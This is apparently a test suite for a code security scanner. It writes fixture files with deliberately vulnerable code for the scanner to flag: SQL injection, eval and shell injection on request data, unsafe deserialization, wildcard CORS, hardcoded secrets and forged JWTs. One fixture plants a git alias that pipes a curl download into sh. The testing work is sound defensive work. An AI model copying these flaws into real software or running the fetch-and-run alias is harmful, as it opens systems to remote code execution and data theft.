"""Rule accuracy: the false positives and false negatives found by reviewing real projects."""

import base64
import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from mmu_cli import cli, vibecheck  # noqa: E402
from mmu_cli.vibecheck import analysis, engine  # noqa: E402

# Assembled at runtime so no key-shaped literal is committed.
STRIPE_KEY = "sk_" + "live_" + "a1b2c3d4e5" * 3
GITHUB_TOKEN = "gh" + "p_" + "a1b2c3d4e5f6" * 3


def jwt(role: str, iss: str = "supabase") -> str:
    def b64(data: dict) -> str:
        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
    return f"{b64({'alg': 'HS256', 'typ': 'JWT'})}.{b64({'iss': iss, 'role': role})}.{'s1G' * 14}"


def run_cli(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with mock.patch.object(sys, "argv", ["mmu", *argv]), redirect_stdout(out), redirect_stderr(err):
        try:
            code = cli.main()
        except SystemExit as exc:
            code = int(exc.code or 0)
    return code, out.getvalue(), err.getvalue()


class Project(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name).resolve()
        self.addCleanup(self._tmp.cleanup)
        self.files: list[Path] = []

    def write(self, rel: str, content: str) -> Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        engine.reset_caches()
        if path not in self.files:
            self.files.append(path)
        return path

    def scan(self) -> dict[str, list]:
        out: dict[str, list] = {}
        for f in vibecheck.scan(self.root).findings:
            out.setdefault(f.check, []).append(f)
        return out

    def status(self, rule: str) -> str:
        return self.scan()[rule][0].status

    def lines(self, finding) -> list[tuple[str, int | None]]:
        return [(loc.path, loc.line) for loc in finding.locations]


class CommentStrippingTests(unittest.TestCase):
    def test_js_comments_are_blanked_and_offsets_kept(self):
        src = 'const a = "// not a comment"; // real comment\n/* block\n sentry */ const u = "https://x.dev/a";\n'
        out = analysis.strip_comments(src, ".ts")
        self.assertEqual(len(out), len(src))
        self.assertEqual(out.count("\n"), src.count("\n"))
        self.assertIn('"// not a comment"', out)
        self.assertNotIn("real comment", out)
        self.assertNotIn("sentry", out)
        self.assertIn("https://x.dev/a", out)

    def test_python_comments_and_docstrings_are_blanked(self):
        src = 'def f():\n    """Example::\n\n        DEBUG = True\n    """\n    x = "# kept"  # dropped\n    return x\n'
        out = analysis.strip_comments(src, ".py")
        self.assertEqual(len(out), len(src))
        self.assertNotIn("DEBUG = True", out)
        self.assertNotIn("dropped", out)
        self.assertIn('"# kept"', out)


class SecretsTests(Project):
    def test_config_and_data_files_are_scanned(self):
        for rel in ("config/prod.json", "deploy/values.yaml", "infra/main.tf", "app.properties", "lib/gh.mjs", "Dockerfile"):
            self.write(rel, f'key = "{STRIPE_KEY}"\n')
        finding = self.scan()["secrets"][0]
        self.assertEqual(finding.status, "fail")
        self.assertEqual(
            sorted(finding.files),
            ["Dockerfile", "app.properties", "config/prod.json", "deploy/values.yaml", "infra/main.tf", "lib/gh.mjs"],
        )

    def test_lockfiles_templates_and_placeholders_are_not_reported(self):
        self.write("package-lock.json", f'{{"integrity": "{STRIPE_KEY}"}}\n')
        self.write(".env.example", f"STRIPE_SECRET_KEY={STRIPE_KEY}\n")
        prefix, aws_doc_key = "sk_" + "live_", "AKIA" + "IOSFODNN7" + "EXAMPLE"
        self.write("docs.py", f'A = "{prefix}{"x" * 24}"\nB = "{aws_doc_key}"\nC = "{prefix}{"A" * 30}"\n')
        self.assertEqual(self.status("secrets"), "ok")

    def test_env_variants_follow_gitignore(self):
        self.write(".env.production", f"STRIPE_SECRET_KEY={STRIPE_KEY}\n")
        self.write(".gitignore", ".env\n")
        self.assertEqual(self.scan()["secrets"][0].files, [".env.production"])
        for pattern in ("/.env.production", ".env*", ".env.*", "*.production"):
            with self.subTest(pattern=pattern):
                self.write(".gitignore", pattern + "\n")
                self.assertEqual(self.status("secrets"), "ok")
        self.write(".gitignore", ".env*\n!.env.production\n")
        self.assertEqual(self.status("secrets"), "fail")

    def test_gitignore_matcher_patterns(self):
        cases = [
            ("/.env", ".env", True), ("/.env", "apps/web/.env", False), (".env", "apps/web/.env", True),
            ("*.env", "prod.env", True), (".env*", ".env.local", True), ("secrets/", "secrets/.env", True),
            ("apps/*/.env", "apps/web/.env", True), ("**/.env", "a/b/.env", True), ("**/.env", ".env", True),
            ("node_modules", ".env", False),
        ]
        for pattern, rel, expected in cases:
            with self.subTest(pattern=pattern, rel=rel):
                self.assertEqual(engine._pattern_ignores(rel, pattern), expected)

    def test_git_check_ignore_is_used_inside_a_repository(self):
        subprocess.run(["git", "-C", str(self.root), "init", "-q"], check=True, capture_output=True)
        self.write(".git/info/exclude", "local-secrets.env\n")
        self.write("local-secrets.env", f"STRIPE_SECRET_KEY={STRIPE_KEY}\n")
        self.write("prod.env", f"STRIPE_SECRET_KEY={STRIPE_KEY}\n")
        self.assertEqual(self.scan()["secrets"][0].files, ["prod.env"])

    def test_service_role_jwt_in_source_is_p0_and_names_the_client_leak(self):
        self.write("components/Admin.tsx", f'"use client";\nconst db = createClient(url, "{jwt("service_role")}");\n')
        self.write("lib/anon.ts", f'export const anon = "{jwt("anon")}";\n')
        self.write("supabase/seed.ts", f'export const local = "{jwt("service_role", iss="supabase-demo")}";\n')
        finding = self.scan()["secrets"][0]
        self.assertEqual((finding.status, finding.severity), ("fail", "P0"))
        self.assertEqual(self.lines(finding), [("components/Admin.tsx", 2)])
        self.assertIn("use client", finding.message)
        self.assertNotIn(jwt("service_role"), json.dumps(finding.to_dict(), ensure_ascii=False))

    def test_server_only_provider_key_behind_public_prefix(self):
        self.write("app/api/ai/route.ts", "const k = process.env.NEXT_PUBLIC_OPENAI_API_KEY;\nconst p = process.env.NEXT_PUBLIC_POSTHOG_KEY;\n")
        finding = self.scan()["client-bundle-secrets"][0]
        self.assertEqual(self.lines(finding), [("app/api/ai/route.ts", 1)])

    def test_signing_secret_literals_and_fallbacks(self):
        self.write("app/config.py", (
            'import os\n'
            'jwt_secret: str = "change-me-super-secret"\n'
            'SECRET_KEY = os.getenv("SECRET_KEY", "dev")\n'
            'SESSION_SECRET = os.environ.get("SESSION_SECRET") or "fallback-value"\n'
            'OK_1 = os.environ["JWT_SECRET"]\n'
            'JWT_SECRET_ENV_NAME = "JWT_SECRET"\n'
            'JWT_ALGORITHM = "HS256"\n'
            'secret_key_header = "X-Secret"\n'
        ))
        self.write("src/auth.ts", (
            'const a = process.env.SESSION_SECRET || "changeme";\n'
            'const b = process.env.JWT_SECRET ?? "dev-secret";\n'
            'const JWT_SECRET = "hardcoded-value";\n'
            'const ok = process.env.JWT_SECRET;\n'
            'const label = { secret: "Secret" };\n'
        ))
        self.write("tests/test_auth.py", 'SECRET_KEY = "test-secret"\n')
        finding = self.scan()["jwt-secret-default"][0]
        self.assertEqual((finding.status, finding.severity), ("fail", "P0"))
        self.assertEqual(
            self.lines(finding),
            [("app/config.py", 2), ("app/config.py", 3), ("app/config.py", 4), ("src/auth.ts", 1), ("src/auth.ts", 2), ("src/auth.ts", 3)],
        )
        self.assertNotIn("change-me-super-secret", json.dumps(finding.to_dict()))


class WebhookTests(Project):
    UNVERIFIED = (
        'export async function POST(req: Request) {\n  const event = await req.json();\n'
        '  if (event.type === "invoice.paid") await activate(event.data.object.customer);\n  return ok();\n}\n'
    )

    def test_judgment_is_per_handler(self):
        self.write("app/api/webhooks/stripe/route.ts", (
            'export async function POST(req: Request) {\n'
            '  const event = stripe.webhooks.constructEvent(await req.text(), req.headers.get("stripe-signature")!, secret);\n'
            '  if (event.type === "invoice.paid") await activate(event.data.object.customer);\n  return ok();\n}\n'
        ))
        self.write("app/api/webhooks/legacy/route.ts", self.UNVERIFIED)
        finding = self.scan()["webhook-signature"][0]
        self.assertEqual(finding.status, "fail")
        self.assertEqual(self.lines(finding), [("app/api/webhooks/legacy/route.ts", 1)])
        self.assertIn("1 of 2", finding.message)

    def test_a_comment_is_not_verification(self):
        self.write("app/api/webhooks/stripe/route.ts", "// TODO verify stripe-signature with constructEvent\n" + self.UNVERIFIED)
        self.assertEqual(self.status("webhook-signature"), "fail")

    def test_verification_in_an_imported_helper_counts(self):
        self.write("lib/stripe/verify.ts", "export const parse = (b, s) => stripe.webhooks.constructEvent(b, s, process.env.STRIPE_WEBHOOK_SECRET!);\n")
        self.write("app/api/webhooks/stripe/route.ts", 'import { parse } from "@/lib/stripe/verify";\n' + self.UNVERIFIED)
        self.assertEqual(self.status("webhook-signature"), "ok")

    def test_verification_idioms_are_recognised(self):
        idioms = {
            "app/routers/webhooks.py": (
                "import stripe\nfrom fastapi import APIRouter, Header, Request\nrouter = APIRouter()\n\n"
                '@router.post("/webhooks/stripe")\nasync def hook(request: Request, stripe_signature: str = Header(None)):\n'
                "    event = stripe.Webhook.construct_event(await request.body(), stripe_signature, SECRET)\n"
                '    if event["type"] == "invoice.paid":\n        activate(event)\n'
            ),
            "src/github.ts": (
                'app.post("/webhooks/github", async (c) => {\n  const sig = c.req.header("x-hub-signature-256");\n'
                "  if (!timingSafeEqual(sig, hmac(await c.req.text()))) return c.text('no', 401);\n"
                "  const payload = await c.req.json();\n  if (payload.action === 'opened') await notify(payload);\n});\n"
            ),
            "app/api/webhooks/clerk/route.ts": (
                'import { Webhook } from "svix";\nexport async function POST(req: Request) {\n'
                "  const evt = new Webhook(secret).verify(await req.text(), headers);\n"
                '  if (evt.type === "user.created") await createUser(evt.data);\n}\n'
            ),
            "app/api/webhooks/clerk2/route.ts": (
                'import { verifyWebhook } from "@clerk/nextjs/webhooks";\nexport async function POST(req: Request) {\n'
                '  const evt = await verifyWebhook(req);\n  if (evt.type === "user.created") await createUser(evt.data);\n}\n'
            ),
        }
        for rel, content in idioms.items():
            self.write(rel, content)
        found = self.scan()
        self.assertEqual(found["webhook-signature"][0].status, "ok", found["webhook-signature"][0].locations)
        self.assertIn("all 4", found["webhook-signature"][0].message)

    def test_handler_is_found_by_content_when_the_filename_says_nothing(self):
        self.write("server.js", (
            'const app = require("express")();\n'
            'app.post("/stripe/hook", async (req, res) => {\n'
            '  if (req.body.type === "checkout.session.completed") await pay(req.body.data.object);\n  res.sendStatus(200);\n});\n'
        ))
        finding = self.scan()["webhook-signature"][0]
        self.assertEqual(self.lines(finding), [("server.js", 2)])
        self.assertIn("express.raw", finding.fix)

    def test_webhook_named_ui_and_settings_code_is_not_a_handler(self):
        self.write("components/webhook/Form.tsx", "export function WebhookForm() { return <form />; }\n")
        self.write("pages/api/teams/[slug]/webhooks.ts", (
            "export default async function handler(req, res) {\n"
            "  if (req.method === 'POST') return res.json(await createWebhook(req.body.url, req.body.eventTypes));\n}\n"
        ))
        found = self.scan()
        self.assertEqual(found["webhook-signature"][0].status, "skip")
        self.assertEqual(found["webhook-idempotency"][0].status, "skip")

    def test_idempotency_is_p1_and_recognises_real_dedup_code(self):
        verified = (
            'export async function POST(req: Request) {\n'
            '  const event = stripe.webhooks.constructEvent(await req.text(), sig, secret);\n'
            '  if (event.type === "checkout.session.completed") {\n    %s\n  }\n  return ok();\n}\n'
        )
        self.write("app/api/webhooks/a/route.ts", verified % "// dedupe later\n    await db.insert(credits).values({ n: 100 });")
        finding = self.scan()["webhook-idempotency"][0]
        self.assertEqual((finding.severity, finding.status), ("P1", "warn"))
        self.write("app/api/webhooks/a/route.ts", verified % (
            "const seen = await db.insert(events).values({ id: event.id }).onConflictDoNothing().returning();\n"
            "    if (seen.length) await db.insert(credits).values({ n: 100 });"
        ))
        self.assertEqual(self.status("webhook-idempotency"), "ok")
        self.write("app/routers/hooks.py", (
            'import stripe\n@router.post("/webhooks/stripe")\nasync def hook(request):\n'
            "    event = stripe.Webhook.construct_event(await request.body(), sig, SECRET)\n"
            '    if event["type"] == "invoice.paid":\n'
            "        session.execute(insert(StripeEvent).values(id=event[\"id\"]).on_conflict_do_nothing())\n"
            "        session.add(Grant(user=1))\n"
        ))
        self.assertEqual(self.status("webhook-idempotency"), "ok")


class InjectionTests(Project):
    def test_prose_fstrings_are_not_sql(self):
        self.write("cli.py", (
            'def banner(v, name, n):\n'
            '    print(f"Update available: {v}")\n'
            '    print(f"Select a plan for {name}")\n'
            '    print(f"Select {n} items from the list")\n'
            '    log.info(f"Deleted from cache {name}")\n'
            '    return f"Insert into the slot {n}"\n'
        ))
        self.assertEqual(self.status("sql-fstring"), "ok")

    def test_python_sql_shapes(self):
        self.write("db.py", (
            'def run(cur, db, uid, name, ids, TABLE, placeholders):\n'
            '    cur.execute(f"select * from users where id = {uid}")\n'                       # 2: sink, lower case
            '    cur.execute("SELECT * FROM users WHERE name = \'%s\'" % name)\n'              # 3: % formatting
            '    cur.execute("SELECT * FROM users WHERE name = \'{}\'".format(name))\n'        # 4: .format
            '    cur.execute("SELECT * FROM users WHERE id = " + uid)\n'                       # 5: concatenation
            '    q = f"DELETE FROM users WHERE id = {uid}"\n'                                  # 6: assigned, upper case
            '    db.execute(text(q))\n'
            '    cur.execute("SELECT * FROM users WHERE id = %s", (uid,))\n'                   # bound
            '    cur.execute(f"SELECT * FROM {TABLE} WHERE id = %s", (uid,))\n'                # constant identifier
            '    cur.execute(f"SELECT * FROM users WHERE id IN ({placeholders})", ids)\n'      # generated placeholders
            '    cur.execute(f"SELECT * FROM users LIMIT {int(uid)}")\n'                       # numeric cast
        ))
        finding = self.scan()["sql-fstring"][0]
        self.assertEqual(self.lines(finding), [("db.py", n) for n in (2, 3, 4, 5, 6)])

    def test_js_sql_shapes(self):
        self.write("src/db.ts", (
            "export async function run(db, prisma, sql, req, column) {\n"
            "  await db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);\n"           # 2
            '  await db.query("UPDATE users SET paid = true WHERE id = " + req.body.id);\n'          # 3
            "  await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${req.query.id}`);\n"    # 4
            "  await db.query('SELECT * FROM users WHERE id = $1', [req.body.id]);\n"
            "  await sql`SELECT * FROM users WHERE id = ${req.body.id}`;\n"
            "  await prisma.$queryRaw`SELECT * FROM users WHERE id = ${req.body.id}`;\n"
            "  await db.query(`SELECT id FROM users ORDER BY ${column}`);\n"
            "  console.log(`Update available: ${req.body.v}`);\n"
            "}\n"
        ))
        finding = self.scan()["sql-fstring"][0]
        self.assertEqual(self.lines(finding), [("src/db.ts", 2), ("src/db.ts", 3), ("src/db.ts", 4)])
        self.assertIn("$1", finding.fix)

    def test_yaml_positional_safe_loader_is_fine(self):
        self.write("cfg.py", "import yaml\na = yaml.load(f, yaml.SafeLoader)\nb = yaml.load(f, Loader=yaml.CSafeLoader)\nc = yaml.load(f, yaml.Loader)\n")
        finding = self.scan()["unsafe-deserialization"][0]
        self.assertEqual(self.lines(finding), [("cfg.py", 4)])

    def test_pickle_of_a_local_file_warns_and_request_data_blocks(self):
        self.write("ml.py", "import pickle\nmodel = pickle.load(open('model.pkl', 'rb'))\n")
        found = self.scan()["unsafe-deserialization"]
        self.assertEqual([(f.severity, f.status) for f in found], [("P1", "warn")])
        self.write("api.py", "import pickle\nasync def up(file):\n    return pickle.loads(await file.read())\n")
        found = self.scan()["unsafe-deserialization"]
        self.assertEqual([(f.severity, f.status) for f in found], [("P0", "fail"), ("P1", "warn")])

    def test_code_injection_needs_request_data_in_the_same_expression(self):
        self.write("server.js", (
            'const { exec } = require("child_process");\n'
            'app.post("/run", (req, res) => res.json(eval(req.body.code)));\n'               # 2
            'app.get("/t", (req, res) => exec(`convert ${req.query.file}`, cb));\n'          # 3
            'app.get("/f", (req, res) => res.json(new Function(req.body.src)()));\n'         # 4
            'app.get("/ok1", (req, res) => res.json(/^[a-z]+$/.exec(req.params.slug)));\n'
            'app.get("/ok2", (req, res) => res.json(eval("1 + 1")));\n'
            'app.get("/ok3", async (req, res) => res.json(await redis.eval(script, 1, req.query.key)));\n'
        ))
        self.write("views.py", (
            "import subprocess\n"
            "def calc(request):\n    return eval(request.GET['q'])\n"                         # 3
            "def ping(request):\n    return subprocess.run(['ping', request.GET['h']])\n"
            "def sh(request):\n    return subprocess.run('ping ' + request.GET['h'], shell=True)\n"  # 7
            "def ok(request):\n    return eval('1 + 1')\n"
        ))
        finding = self.scan()["code-injection"][0]
        self.assertEqual((finding.severity, finding.status), ("P0", "fail"))
        self.assertEqual(self.lines(finding), [("server.js", 2), ("server.js", 3), ("server.js", 4), ("views.py", 3), ("views.py", 7)])


class ServerHardeningTests(Project):
    def test_rate_limit_evidence_must_be_real(self):
        self.write("package.json", '{"dependencies": {"express": "^4", "lodash": "^4", "@upstash/redis": "^1"}}')
        self.write("server.js", (
            'const app = require("express")();\nconst { throttle } = require("lodash");\n'
            'const { Redis } = require("@upstash/redis");\n// TODO rate limit the login route\n'
        ))
        self.assertEqual(self.status("rate-limiting"), "warn")
        self.write("server.js", 'const app = require("express")();\napp.use(rateLimit({ windowMs: 60000, limit: 10 }));\n')
        self.assertEqual(self.status("rate-limiting"), "ok")

    def test_the_word_expression_is_not_a_server(self):
        self.write("package.json", '{"dependencies": {"cron-expression-parser": "^1"}}')
        self.write("lib.js", "export const expression = 1; // express delivery\n")
        self.assertEqual(self.status("rate-limiting"), "skip")

    def test_installed_but_unused_limiter_still_warns(self):
        self.write("requirements.txt", "fastapi\nslowapi\n")
        self.write("app/main.py", "from fastapi import FastAPI\n\napp = FastAPI()\n")
        finding = self.scan()["rate-limiting"][0]
        self.assertEqual(finding.status, "warn")
        self.assertIn("slowapi", finding.fix)
        self.assertNotIn("express-rate-limit", finding.fix)

    def test_cloudflare_rate_limit_binding(self):
        self.write("package.json", '{"dependencies": {"hono": "^4"}}')
        self.write("wrangler.toml", 'name = "w"\n[[unsafe.bindings]]\nname = "RL"\ntype = "ratelimit"\n')
        self.write("src/index.ts", 'import { Hono } from "hono";\nconst app = new Hono();\n')
        self.assertEqual(self.status("rate-limiting"), "ok")

    def test_cors_default_and_credentials(self):
        self.write("server.js", 'const cors = require("cors");\napp.use(cors());\n')
        finding = self.scan()["cors-wildcard"][0]
        self.assertEqual(self.lines(finding), [("server.js", 2)])
        self.assertIn("cors() without options", finding.message)
        self.write("server.js", 'const cors = require("cors");\napp.use(cors({ origin: ["https://a.example"] }));\n')
        self.assertEqual(self.status("cors-wildcard"), "ok")
        self.write("main.py", 'from fastapi import FastAPI\napp.add_middleware(C, allow_origins=["*"], allow_credentials=True)\n')
        finding = self.scan()["cors-wildcard"][0]
        self.assertIn("credentials", finding.message)
        self.assertIn("allow_origins", finding.fix)
        self.assertNotIn("Express", finding.fix)

    def test_debug_mode_variants(self):
        self.write("app.py", 'from flask import Flask\napp = Flask(__name__)\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", debug=True)\n')
        self.write("ok.py", 'app.run(debug=os.environ.get("DEBUG") == "1")\n"""Docs::\n\n    DEBUG = True\n"""\n')
        self.write("Dockerfile", 'FROM python:3.12\nCMD ["uvicorn", "app:app", "--reload"]\n')
        self.write("Dockerfile.dev", 'FROM python:3.12\nCMD ["uvicorn", "app:app", "--reload"]\n')
        finding = self.scan()["debug-mode"][0]
        self.assertEqual(self.lines(finding), [("app.py", 4), ("Dockerfile", 2)])

    def test_stack_trace_leak(self):
        self.write("main.py", (
            "import traceback\nfrom fastapi.responses import JSONResponse\n\n"
            "async def handler(request, exc):\n"
            '    return JSONResponse(status_code=500, content={"trace": traceback.format_exc()})\n\n'
            "def worker():\n    try:\n        run()\n    except Exception:\n        logger.error(traceback.format_exc())\n"
        ))
        self.write("server.js", (
            "app.use((err, req, res, next) => res.status(500).json({ error: err.message, stack: err.stack }));\n"
            "app.use((err, req, res, next) => res.status(500).json({ ...(process.env.NODE_ENV === 'development' && { stack: err.stack }) }));\n"
            "app.use((err, req, res, next) => { console.error(err.stack); res.status(500).json({ error: 'x' }); });\n"
        ))
        finding = self.scan()["stack-trace-leak"][0]
        self.assertEqual(self.lines(finding), [("main.py", 5), ("server.js", 1)])

    def test_llm_route_needs_auth_or_a_limiter(self):
        route = (
            'import OpenAI from "openai";\nconst openai = new OpenAI();\n'
            "export async function POST(req: Request) {\n%s"
            '  const r = await openai.chat.completions.create({ model: "gpt-4o-mini", messages: [{ role: "user", content: "hi" }] });\n'
            "  return Response.json(r);\n}\n"
        )
        self.write("app/api/ai/route.ts", route % "")
        finding = self.scan()["llm-route-unthrottled"][0]
        self.assertEqual((finding.severity, finding.status), ("P1", "warn"))
        self.assertEqual(self.lines(finding), [("app/api/ai/route.ts", 4)])
        self.write("app/api/ai/route.ts", route % "  const session = await auth();\n  if (!session) return new Response(null, { status: 401 });\n")
        self.assertEqual(self.status("llm-route-unthrottled"), "ok")
        self.write("app/api/ai/route.ts", route % "")
        self.write("middleware.ts", 'import { clerkMiddleware } from "@clerk/nextjs/server";\nexport default clerkMiddleware();\n')
        self.assertEqual(self.status("llm-route-unthrottled"), "ok")

    def test_admin_route_needs_an_auth_check(self):
        self.write("app/api/admin/users/route.ts", "export async function GET() {\n  return Response.json(await supabaseAdmin.auth.admin.listUsers());\n}\n")
        finding = self.scan()["admin-route-no-auth"][0]
        self.assertEqual((finding.severity, finding.status), ("P1", "warn"))
        self.write("app/api/admin/users/route.ts", (
            "export async function GET() {\n  const { data: { user } } = await supabase.auth.getUser();\n"
            "  if (user?.app_metadata.role !== 'admin') return new Response(null, { status: 403 });\n  return Response.json([]);\n}\n"
        ))
        self.assertEqual(self.status("admin-route-no-auth"), "ok")
        self.write("api.py", 'from fastapi import APIRouter\nrouter = APIRouter()\n\n@router.get("/admin/stats")\ndef stats():\n    return {}\n')
        self.assertEqual(self.lines(self.scan()["admin-route-no-auth"][0]), [("api.py", 4)])

    def test_dangerous_html(self):
        self.write("components/Note.tsx", "export const Note = ({ html }) => <div dangerouslySetInnerHTML={{ __html: html }} />;\n")
        self.write("components/Safe.tsx", (
            'import DOMPurify from "dompurify";\n'
            "export const Safe = ({ html }) => <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;\n"
        ))
        self.write("app/layout.tsx", (
            "export default function L() {\n"
            '  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;\n}\n'
        ))
        self.write("src/widget.js", 'el.innerHTML = "";\nother.innerHTML = userInput;\n')
        finding = self.scan()["dangerous-html"][0]
        self.assertEqual(self.lines(finding), [("components/Note.tsx", 1), ("src/widget.js", 2)])


class ScopeAndStructureTests(Project):
    def test_user_project_directories_are_scanned(self):
        for rel in ("scripts/seed.py", "tests/helpers.py", "docs/conf.py", "examples/app.py", "cli/main.py"):
            self.write(rel, 'q = f"SELECT * FROM t WHERE id = {x}"\n')
        self.write("vendor/lib.py", 'q = f"SELECT * FROM t WHERE id = {x}"\n')
        self.write("apps/web/.vercel/output/fn.py", 'q = f"SELECT * FROM t WHERE id = {x}"\n')
        finding = self.scan()["sql-fstring"][0]
        self.assertEqual(sorted(finding.files), ["cli/main.py", "docs/conf.py", "examples/app.py", "scripts/seed.py", "tests/helpers.py"])

    def test_skip_paths_come_from_config(self):
        self.write("scripts/seed.py", 'q = f"SELECT * FROM t WHERE id = {x}"\n')
        self.write("tools/gen.py", 'q = f"SELECT * FROM t WHERE id = {x}"\n')
        self.write(".mmu/config.toml", '[doctor]\nskip_paths = ["scripts"]\n\n[vibecheck]\nskip_paths = ["tools"]\n')
        self.assertEqual(self.status("sql-fstring"), "ok")

    def test_this_repository_configures_its_own_excludes(self):
        self.assertNotIn("tests", cli.DEFAULT_SKIP_PATHS)
        self.assertNotIn("scripts", cli.DEFAULT_SKIP_PATHS)
        skip = cli.vibecheck_skip_paths(ROOT)
        self.assertTrue({"src/mmu_cli", "tests", "bench/fixtures"} <= skip)

    def test_results_do_not_depend_on_file_count_or_walk_order(self):
        for i in range(450):
            self.write(f"src/gen/m{i:03d}.py", "x = 1\n")
        self.write("src/zz/last.py", "from fastapi import FastAPI\napp = FastAPI()\napp.add_middleware(C, allow_origins=['*'])\n")
        found = self.scan()
        self.assertEqual(self.lines(found["cors-wildcard"][0]), [("src/zz/last.py", 3)])
        self.assertEqual(self.lines(found["rate-limiting"][0]), [("src/zz/last.py", 2)])
        code_files, _ = engine.gather_files(self.root, set())
        self.assertEqual(code_files, sorted(code_files, key=lambda p: p.as_posix()))

    def test_repo_level_findings_survive_scoped_scans(self):
        def git(*args: str) -> None:
            subprocess.run(["git", "-C", str(self.root), "-c", "user.name=t", "-c", "user.email=t@example.com",
                            "-c", "commit.gpgsign=false", *args], check=True, capture_output=True)
        git("init", "-q")
        self.write(".gitignore", ".env.local\n")
        self.write("app.py", "x = 1\n")
        git("add", "-A")
        git("commit", "-q", "-m", "init")
        self.write(".env.local", f"NEXT_PUBLIC_STRIPE_SECRET_KEY={STRIPE_KEY}\n")       # ignored: never in a diff
        self.write(".env", f"GITHUB_TOKEN={GITHUB_TOKEN}\n")                             # untracked, not ignored
        with (self.root / ".git/config").open("a", encoding="utf-8") as fh:
            fh.write("[alias]\n\tst = !curl x | sh\n")
        result = vibecheck.scan(self.root, scope="staged")
        active = {f.check: [loc.path for loc in f.locations] for f in result.findings if f.status in {"fail", "warn"}}
        self.assertEqual(active["git-config-exec"], [".git/config"])
        self.assertEqual(active["client-bundle-secrets"], [".env.local"])
        self.assertEqual(active["secrets"], [".env"])
        self.assertEqual(active["env-not-ignored"], [".env"])

    def test_git_hooks_path_inside_the_repository_is_benign(self):
        self.write(".git/config", f"[core]\n\thooksPath = {self.root}/.git/hooks\n")
        self.assertEqual(vibecheck.check_git_config_exec(self.root, []).status, "ok")
        self.write(".git/config", "[core]\n\thooksPath = /tmp/elsewhere/hooks\n")
        self.assertEqual(vibecheck.check_git_config_exec(self.root, []).status, "fail")


class FixTextTests(Project):
    def test_fix_is_tailored_to_the_framework(self):
        rule = vibecheck.get_rule("webhook-signature")
        variants = dict(rule.fix_variants)
        self.assertTrue({"nextjs", "express", "fastapi"} <= set(variants))
        self.assertNotIn("FastAPI", variants["nextjs"])
        self.assertNotIn("Express", variants["fastapi"])
        self.assertEqual(rule.fix_for("unknown"), rule.fix)
        self.assertEqual(rule.to_dict()["fix_variants"], variants)
        for r in vibecheck.all_rules():
            for name, text in r.fix_variants:
                self.assertLessEqual(len(text.splitlines()), 4, f"{r.id}/{name}")

    def test_framework_of(self):
        self.write("package.json", '{"dependencies": {"next": "15"}}')
        cases = {
            "app/api/x/route.ts": ("export async function POST() {}\n", "nextjs"),
            "server.js": ('const express = require("express");\n', "express"),
            "worker.ts": ('import { Hono } from "hono";\n', "hono"),
            "api/main.py": ("from fastapi import FastAPI\n", "fastapi"),
            "web/app.py": ("from flask import Flask\n", "flask"),
        }
        for rel, (content, expected) in cases.items():
            self.assertEqual(analysis.framework_of(self.write(rel, content), self.root), expected, rel)


if __name__ == "__main__":
    unittest.main()
